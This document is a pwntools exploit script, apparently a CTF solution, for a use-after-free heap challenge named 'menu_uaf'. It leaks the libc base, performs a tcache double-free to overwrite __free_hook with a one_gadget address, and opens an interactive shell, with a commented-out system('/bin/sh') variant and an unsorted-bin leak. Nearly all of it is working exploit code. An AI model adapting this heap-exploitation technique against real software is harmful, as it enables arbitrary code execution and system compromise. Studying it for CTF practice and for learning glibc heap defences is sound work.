### tcahce dup attack ###
from pwn import *

context.arch="amd64"
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#r = process("LD_PRELOAD=/media/sf_D_DRIVE/csie_ctf_2019/note/libc-2.23.so ./note")
r = process("./menu_uaf")
#r = remote("edu-ctf.csie.org", 10179)

def add(size, data):
    r.sendafter("> ", "1")
    r.sendafter(": ", str(size))
    r.sendafter(": ", data)

def show(idx):
    r.sendafter("> ", "2")
    r.sendafter(": ", str(idx))

def delete(idx):
    r.sendafter("> ", "3")
    r.sendafter(": ", str(idx))

r.recvuntil("printf at 0x")
libc_base = int(r.recvline().strip().ljust(8, b'\x00'), 16) - libc.symbols[b'printf']
print("libc_base: ", hex(libc_base))



### to leak libc base
### malloc unsorted bin > 0x400, 
### which is exceed the tcache 
# add(0x500, "leak")
add(0x20, "aaa")
add(0x20, "bbb")
### glibc don't merge tcahche and unsorted bin 
### unsorted bin remain libc because no null pointer after free
# delete(0)
# show(0)
# r.recvline()
# offset = 0x3ebca0
# libc_base = u64(r.recvline().strip().ljust(8, b'\x00')) - offset 
# print("libc_base: ", hex(libc_base))
#input("@")

delete(1)
delete(1)

free_hook = libc.symbols[b'__free_hook']
print("__free_hook: ", hex(free_hook))
add(0x20, p64(libc_base + free_hook))
add(0x20, "ddd")



### one_gadget
### when crash, it met the requirement of one_gadget
add(0x20, p64(libc_base + 0x4f322))
delete(1)

r.interactive()

'''
### system("/bin/sh")
bash_offset = next(l.search('/bin/sh'))
print("bash_offset: ", hex(bash_offset))

system_offset = l.symbols[b'system']
print("system_offset: ", hex(system_offset))

add(0x68, b"aaa" + p64(libc_base + system_offset))
r.sendafter("> ", "1")
r.sendafter("Size: ", str(libc_base + bash_offset))
'''

